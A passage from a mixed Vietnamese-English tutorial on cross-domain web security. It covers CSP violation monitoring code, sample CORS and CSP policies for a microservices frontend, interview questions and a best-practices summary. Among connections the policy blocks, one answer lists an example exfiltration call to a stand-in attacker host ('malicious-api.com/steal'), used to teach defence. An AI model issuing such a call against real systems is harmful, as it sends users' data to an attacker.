    console.error('🚨 High-priority CSP violation:', violation);

    // Send immediate report
    this.sendViolationReport([violation], { priority: 'high' });
  }

  startBatchProcessor() {
    setInterval(() => {
      if (this.violationQueue.length > 0) {
        this.flushViolations();
      }
    }, this.flushInterval);
  }

  flushViolations() {
    if (this.violationQueue.length === 0) return;

    const violations = [...this.violationQueue];
    this.violationQueue = [];

    this.sendViolationReport(violations);
  }

  async sendViolationReport(violations, options = {}) {
    try {
      const report = {
        violations,
        stats: this.getViolationSummary(),
        metadata: {
          userAgent: navigator.userAgent,
          url: window.location.href,
          timestamp: Date.now(),
          sessionId: this.getSessionId(),
          priority: options.priority || 'normal'
        }
      };

      const response = await fetch(this.reportEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(report),
        credentials: 'same-origin'
      });

      if (!response.ok) {
        console.error('Failed to send CSP violation report:', response.status);
      }

    } catch (error) {
      console.error('Error sending CSP violation report:', error);
    }
  }

  getViolationSummary() {
    const summary = {
      totalViolations: 0,
      categories: {},
      severities: {},
      topViolators: []
    };

    for (const [key, stats] of this.violationStats.entries()) {
      summary.totalViolations += stats.count;

      // Category breakdown
      summary.categories[stats.category] =
        (summary.categories[stats.category] || 0) + stats.count;

      // Severity breakdown
      summary.severities[stats.severity] =
        (summary.severities[stats.severity] || 0) + stats.count;
    }

    // Top violators
    summary.topViolators = [...this.violationStats.entries()]
      .sort((a, b) => b[1].count - a[1].count)
      .slice(0, 10)
      .map(([key, stats]) => ({
        pattern: key,
        count: stats.count,
        category: stats.category,
        severity: stats.severity
      }));

    return summary;
  }

  getUserSession() {
    return {
      userId: this.getCurrentUserId(),
      sessionId: this.getSessionId(),
      timestamp: Date.now()
    };
  }

  getCurrentUserId() {
    // Get user ID từ authentication system
    return localStorage.getItem('userId') || 'anonymous';
  }

  getSessionId() {
    // Get or generate session ID
    let sessionId = sessionStorage.getItem('csp_session_id');
    if (!sessionId) {
      sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
      sessionStorage.setItem('csp_session_id', sessionId);
    }
    return sessionId;
  }
}

// Initialize monitoring
const cspMonitor = new CSPViolationMonitor({
  reportEndpoint: 'https://security-api.mycompany.com/csp/violations',
  batchSize: 5,
  flushInterval: 15000
});

// Server-side violation analysis
class CSPViolationAnalyzer {
  constructor() {
    this.violationStorage = new ViolationStorage();
    this.alertSystem = new SecurityAlertSystem();
    this.patterns = new PatternDetector();
  }

  async analyzeViolationBatch(violations) {
    for (const violation of violations) {
      // Store violation
      await this.violationStorage.store(violation);

      // Pattern analysis
      const patterns = await this.patterns.analyze(violation);

      // Check for attack campaigns
      if (this.isPartOfAttackCampaign(violation, patterns)) {
        await this.alertSystem.triggerSecurityAlert({
          type: 'attack_campaign_detected',
          violation,
          patterns,
          confidence: patterns.confidence
        });
      }

      // Update CSP policy suggestions
      this.updatePolicySuggestions(violation);
    }
  }

  isPartOfAttackCampaign(violation, patterns) {
    // Multiple violations từ same source trong short timeframe
    // Similar attack patterns across different sessions
    // Known malicious domains/patterns

    return patterns.confidence > 0.8 &&
           patterns.frequency > 10 &&
           patterns.timespan < 3600000; // 1 hour
  }

  updatePolicySuggestions(violation) {
    // Generate suggestions to tighten CSP based on violations
    // Add new domains to whitelist if legitimate
    // Suggest removing 'unsafe-inline' if possible
  }
}
```


### 🎯 CSP Interview Questions & Best Practices


**Senior Level Questions:**


**Q1: Explain how CSP affects cross-domain communication và how to configure it properly.**


```javascript
/**
 * Answer: CSP impacts cross-domain communication trong several ways:
 */

// 1. connect-src directive controls fetch(), XHR, WebSocket connections
const corsAndCSP = {
  // CSP policy:
  "connect-src": "https://api.company.com https://analytics.company.com",

  // This policy allows:
  validConnections: [
    'fetch("https://api.company.com/data")', // ✅ Allowed
    'new WebSocket("wss://api.company.com/ws")', // ✅ Allowed (wss: derived từ https:)
  ],

  // But blocks:
  blockedConnections: [
    'fetch("https://malicious-api.com/steal")', // ❌ Blocked by CSP
    'xhr.open("POST", "http://api.company.com")', // ❌ Blocked (HTTP not HTTPS)
  ]
};

// 2. frame-src affects iframe communication
const iframeCSP = {
  "frame-src": "https://trusted-widget.com https://payment-gateway.com",

  // PostMessage communication still works nếu iframe được allow load:
  validIframeCommunication: `
    // Parent page:
    const iframe = document.querySelector('iframe[src="https://trusted-widget.com"]');
    iframe.contentWindow.postMessage(data, 'https://trusted-widget.com'); // ✅ Works
  `,

  // But iframe từ blocked domain won't load:
  blockedIframe: `
    <iframe src="https://malicious-widget.com"></iframe> <!-- ❌ Blocked by CSP -->
  `
};

// 3. Best practice: Coordinated CORS + CSP configuration
class CoordinatedCORSCSP {
  generatePolicies(allowedOrigins) {
    return {
      // CORS configuration
      corsPolicy: {
        allowedOrigins: allowedOrigins,
        allowedMethods: ['GET', 'POST', 'PUT', 'DELETE'],
        allowCredentials: true
      },

      // Matching CSP configuration
      cspPolicy: {
        'connect-src': ["'self'", ...allowedOrigins],
        'frame-src': allowedOrigins.filter(origin => this.isFrameSource(origin)),
        'script-src': ["'self'", "'nonce-{NONCE}'", ...this.getTrustedScriptSources(allowedOrigins)]
      }
    };
  }
}
```


**Q2: Design CSP policy for a complex microservices frontend architecture.**


```javascript
/**
 * Requirements:
 * - Frontend communicates với 20+ microservices
 * - Uses CDN cho static assets
 * - Integrates third-party services (analytics, payments, chat)
 * - Supports user-uploaded content
 * - Development/staging/production environments
 */

class MicroservicesCSPPolicy {
  constructor(environment) {
    this.environment = environment;
    this.services = this.getServiceConfiguration();
    this.thirdPartyServices = this.getThirdPartyServices();
  }

  generatePolicy() {
    const policy = {
      'default-src': ["'self'"],

      // Microservices API calls
      'connect-src': [
        "'self'",
        ...this.services.map(service => service.endpoint),
        ...this.getWebSocketEndpoints(),
        ...(this.environment === 'development' ? ['ws://localhost:*', 'http://localhost:*'] : [])
      ],

      // Static assets từ CDN
      'img-src': [
        "'self'",
        'data:',
        'blob:', // User uploads
        'https://cdn.company.com',
        'https://user-content.company.com'
      ],

      'font-src': [
        "'self'",
        'https://fonts.gstatic.com',
        'https://cdn.company.com'
      ],

      'style-src': [
        "'self'",
        "'unsafe-inline'", // Temporary - migrating to nonce-based
        'https://fonts.googleapis.com',
        'https://cdn.company.com'
      ],

      // Script loading strategy
      'script-src': [
        "'self'",
        "'strict-dynamic'", // CSP Level 3 feature
        "'nonce-{NONCE}'",
        ...(this.environment === 'production' ? [] : ["'unsafe-eval'"]) // Dev tools
      ],

      // Third-party integrations
      'frame-src': [
        "'self'",
        ...this.thirdPartyServices.payment.map(p => p.domain),
        ...this.thirdPartyServices.chat.map(c => c.domain)
      ],

      // Security headers
      'base-uri': ["'self'"],
      'object-src': ["'none'"],
      'frame-ancestors': ["'none'"],

      // Upgrade insecure requests trong production
      ...(this.environment === 'production' ? {
        'upgrade-insecure-requests': true,
        'block-all-mixed-content': true
      } : {})
    };

    return this.optimizePolicy(policy);
  }

  getServiceConfiguration() {
    const baseServices = [
      { name: 'user-service', endpoint: 'https://user-api.company.com' },
      { name: 'order-service', endpoint: 'https://order-api.company.com' },
      { name: 'payment-service', endpoint: 'https://payment-api.company.com' },
      { name: 'inventory-service', endpoint: 'https://inventory-api.company.com' },
      { name: 'notification-service', endpoint: 'https://notification-api.company.com' }
      // ... more services
    ];

    // Environment-specific overrides
    switch (this.environment) {
      case 'development':
        return baseServices.map(service => ({
          ...service,
          endpoint: service.endpoint.replace('company.com', 'localhost:' + this.getServicePort(service.name))
        }));

      case 'staging':
        return baseServices.map(service => ({
          ...service,
          endpoint: service.endpoint.replace('company.com', 'staging.company.com')
        }));

      default:
        return baseServices;
    }
  }

  optimizePolicy(policy) {
    // Consolidate similar domains
    for (const directive in policy) {
      if (Array.isArray(policy[directive])) {
        policy[directive] = this.consolidateDomains(policy[directive]);
      }
    }

    return policy;
  }

  consolidateDomains(sources) {
    // Group by domain to reduce policy size
    const domains = new Map();
    const others = [];

    for (const source of sources) {
      if (source.startsWith('https://')) {
        const domain = new URL(source).hostname;
        if (!domains.has(domain)) {
          domains.set(domain, []);
        }
        domains.get(domain).push(source);
      } else {
        others.push(source);
      }
    }

    // Convert back to source list
    const consolidated = [...others];
    for (const [domain, urls] of domains.entries()) {
      if (urls.length > 3) {
        // Use wildcard cho domains với many subdomains
        consolidated.push(`https://*.${domain}`);
      } else {
        consolidated.push(...urls);
      }
    }

    return consolidated;
  }
}
```


---


## 📖 CONCLUSION: CROSS-DOMAIN MASTERY FRAMEWORK


### 🎯 The Complete Cross-Domain Decision Matrix


After 15+ years architecting cross-domain solutions tại major tech companies, tôi đã developed một comprehensive decision framework:


```javascript
/**
 * Cross-Domain Solution Selection Framework
 * Use this decision tree để choose optimal solution cho mọi scenario
 */

class CrossDomainSolutionSelector {
  selectSolution(requirements) {
    const analysis = this.analyzeRequirements(requirements);

    // Decision tree based on analysis
    if (analysis.isSimpleDataExchange && analysis.browserSupport.modern) {
      return this.recommendCORS();
    }

    if (analysis.isLegacySupport && analysis.dataType === 'json') {
      return this.recommendJSONP();
    }

    if (analysis.isDevelopment) {
      return this.recommendProxy();
    }

    if (analysis.isProduction && analysis.hasComplexRouting) {
      return this.recommendNginxProxy();
    }

    if (analysis.needsBidirectionalCommunication) {
      return this.recommendPostMessage();
    }

    return this.recommendHybridApproach(analysis);
  }

  analyzeRequirements(req) {
    return {
      environment: req.environment, // dev/staging/prod
      browserSupport: req.browserSupport, // legacy/modern
      dataType: req.dataType, // json/binary/text
      communicationPattern: req.pattern, // one-way/bidirectional
      securityRequirements: req.security, // low/medium/high
      performanceRequirements: req.performance, // low/medium/high
      scalabilityNeeds: req.scalability // low/medium/high
    };
  }
}
```


### 🌟 Best Practices Summary


**Development Phase:**


1. **Start với development proxy** - Fastest setup, no CORS complexity
2. **Plan production architecture early** - Avoid last-minute surprises
3. **Use CSP report-only mode** - Monitor without blocking functionality
4. **Implement comprehensive logging** - Debug issues before production


**Production Architecture:**


1. **CORS for modern APIs** - Industry standard, secure, flexible
2. **Nginx reverse proxy for complex routing** - High performance, battle-tested
3. **PostMessage for iframe communication** - Secure cross-frame messaging
4. **CSP for defense-in-depth** - Additional security layer


**Security First:**


1. **Never trust client-side origin validation** - Always validate server-side
2. **Use nonce-based CSP where possible** - Eliminate 'unsafe-inline'
3. **Implement comprehensive violation monitoring** - Detect attacks early
4. **Regular security audits** - Keep configurations updated


**Performance Optimization:**


1. **Minimize preflight requests** - Use simple requests where possible
2. **Implement request caching strategies** - Reduce server load
3. **Monitor performance metrics** - Track latency and success rates
4. **Optimize for mobile networks** - Consider bandwidth limitations


### 🚀 The Future of Cross-Domain Communication


**Emerging Standards:**


- **Origin Policy**: Declarative origin relationships
- **Trust Token API**: Privacy-preserving identity verification
- **Fetch Metadata**: Enhanced request context
- **Cross-Origin Embedder Policy (COEP)**: Stricter isolation


**Modern Browser Features:**


- **Trusted Types**: XSS prevention at the platform level
- **Origin Trial**: Safe feature experimentation
- **Permissions Policy**: Granular feature control
- **Private Network Access**: Local network security


### 📚 Recommended Learning Path


**Foundation Level** (0-2 years experience):


1. Master Same-Origin Policy fundamentals
2. Understand basic CORS configuration
3. Practice với development proxies
4. Learn CSP basics


**Senior Level** (3-7 years experience):


1. Design production CORS architectures
2. Implement secure PostMessage systems
3. Master advanced CSP patterns
4. Performance optimization techniques


**Principal Level** (8+ years experience):


1. Architect enterprise-scale solutions
2. Design security-first cross-domain strategies
3. Lead cross-domain infrastructure decisions
4. Mentor teams on best practices


### 🎓 Final Advice - Lessons from the Trenches


Từ experience architect cross-domain solutions tại companies với millions of users:


1. **Start Simple, Scale Thoughtfully**: Don't over-engineer early. Begin với simple solutions và evolve as needs grow.
2. **Security Cannot Be Retrofitted**: Build security considerations into architecture từ day 1. It's exponentially harder to add later.
3. **Monitor Everything**: Cross-domain issues often manifest as silent failures. Comprehensive monitoring is essential.
4. **Plan for Multiple Environments**: What works trong development rarely works unchanged trong production. Design với environment differences in mind.
5. **Documentation Saves Lives**: Cross-domain configurations are complex. Document everything cho your future self và team.
6. **Stay Updated**: Browser security features evolve rapidly. Regular updates to policies và implementations are crucial.


**Remember**: Cross-domain problems are not just technical challenges—they're architectural decisions that impact security, performance, maintainability, và developer experience. Choose solutions that align với your long-term technical strategy, not just immediate needs.


---


*"The best cross-domain solution is the one that your team can implement correctly, maintain effectively, và scale confidently."*


**- A Principal Engineer's Perspective**
